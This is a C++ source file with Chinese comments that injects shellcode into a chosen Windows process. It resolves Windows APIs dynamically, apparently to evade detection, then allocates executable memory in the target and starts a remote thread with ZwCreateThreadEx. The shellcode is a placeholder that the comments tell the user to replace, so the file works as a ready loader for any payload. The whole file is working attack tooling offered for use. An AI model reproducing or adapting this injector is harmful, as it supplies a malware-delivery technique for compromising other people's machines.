#include <Windows.h>
#include <stdio.h>
#include "safeApi.h"
#include <iostream>

#ifdef _WIN64
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG CreateThreadFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID pUnkown);
#else
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD dwStackSize,
    DWORD dw1,
    DWORD dw2,
    LPVOID pUnkown);
#endif

// 动态获取API函数指针
    typedef HMODULE (WINAPI* pGetModuleHandleA)(LPCSTR);
    typedef FARPROC (WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
    typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef BOOL (WINAPI* pCloseHandle)(HANDLE);
    typedef BOOL (WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);

int main(int argc, char* argv[]) {
    // shellcode内容请自行替换
    char shellcode[] = {0x12};
    HANDLE hRemoteThread;
    
    pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)SafeGetProcAddress(L"kernel32.dll", "GetModuleHandleA");
    pGetProcAddress myGetProcAddress = (pGetProcAddress)SafeGetProcAddress(L"kernel32.dll", "GetProcAddress");
    pOpenProcess myOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    pCloseHandle myCloseHandle = (pCloseHandle)SafeGetProcAddress(L"kernel32.dll", "CloseHandle");
    pVirtualFreeEx myVirtualFreeEx = (pVirtualFreeEx)SafeGetProcAddress(L"kernel32.dll", "VirtualFreeEx");
    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)SafeGetProcAddress(L"ntdll.dll", "ZwCreateThreadEx");

    if (!myGetModuleHandleA || !myGetProcAddress || !myOpenProcess || !myVirtualAllocEx || !myWriteProcessMemory || !myCloseHandle || !myVirtualFreeEx || !ZwCreateThreadEx) {
        std::cout << "API获取失败" << std::endl;
        return -1;
    }
    DWORD targetPid = 1516; // 替换为目标进程PID
    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        std::cout << "打开目标进程失败" << std::endl;
        return -1;
    }
    LPVOID lpBaseAddress = myVirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpBaseAddress) {
        std::cout << "远程分配内存失败" << std::endl;
        myCloseHandle(hProcess);
        return -1;
    }
    if (!myWriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), 0)) {
        std::cout << "写入shellcode失败" << std::endl;
        myVirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
        myCloseHandle(hProcess);
        return -1;
    }
    NTSTATUS status = ZwCreateThreadEx(
        &hRemoteThread,
        PROCESS_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)lpBaseAddress,
        NULL,
        0, // 关键：第七参数为0
        0,
        0,
        0,
        NULL);
    if (status != 0) {
        std::cout << "ZwCreateThreadEx调用失败，状态码: " << std::hex << status << std::endl;
    }
    if (hRemoteThread) myCloseHandle(hRemoteThread);
    myVirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE);
    myCloseHandle(hProcess);
    return 0;
}
